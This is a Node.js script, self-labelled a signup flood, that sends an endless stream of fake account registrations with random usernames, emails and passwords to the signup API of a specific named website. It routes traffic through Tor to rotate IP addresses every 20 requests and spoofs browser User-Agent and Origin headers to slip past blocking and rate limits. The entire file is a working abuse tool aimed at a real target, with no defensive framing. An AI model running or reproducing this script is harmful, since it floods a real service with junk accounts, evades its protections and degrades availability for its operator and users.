const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');

const URL = 'https://api.aryankaushik.space/api/auth/signup';
const TOR_PROXY = 'socks5://127.0.0.1:9050';
const REQUESTS_PER_IP = 20;
const TIMEOUT_MS = 12000;

const agent = new SocksProxyAgent(TOR_PROXY);

function randomString(len = 10) {
    return Math.random().toString(36).substring(2, len + 2);
}

async function getCurrentIP() {
    try {
        const res = await axios.get('https://ipinfo.io/json', {
            httpsAgent: agent,
            timeout: TIMEOUT_MS
        });
        console.log(`\n🌍 NEW IP → ${res.data.ip} | ${res.data.city}, ${res.data.country}`);
        return res.data.ip;
    } catch (e) {
        console.log(`\n⚠️  IP Check Failed: ${e.message}`);
        return null;
    }
}

async function sendSignup(count) {
    const rand = randomString(8);
    const username = `yoto_${rand}`;
    const email = `${username}@gmail.com`;
    const password = `Pass${rand}123!`;

    const payload = { username, email, password };

    try {
        const res = await axios.post(URL, payload, {
            httpsAgent: agent,
            timeout: TIMEOUT_MS,
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://aeroweb.aryankaushik.space'
            }
        });
        console.log(`[${count}] ${email} → ${res.status} | ${JSON.stringify(res.data)}`);
    } catch (err) {
        const status = err.response ? err.response.status : 'ERROR';
        const body = err.response ? JSON.stringify(err.response.data) : err.message;
        console.log(`[${count}] ${email} → ${status} | ${body}`);
    }
}

async function main() {
    console.log("=== Tor + tornet Signup Flood Started ===\n");
    while (true) {
        await getCurrentIP();
        for (let i = 1; i <= REQUESTS_PER_IP; i++) {
            await sendSignup(i);
        }
        console.log(`✅ Batch of ${REQUESTS_PER_IP} requests completed\n`);
        await new Promise(r => setTimeout(r, 800)); // small wait for rotation
    }
}

main();
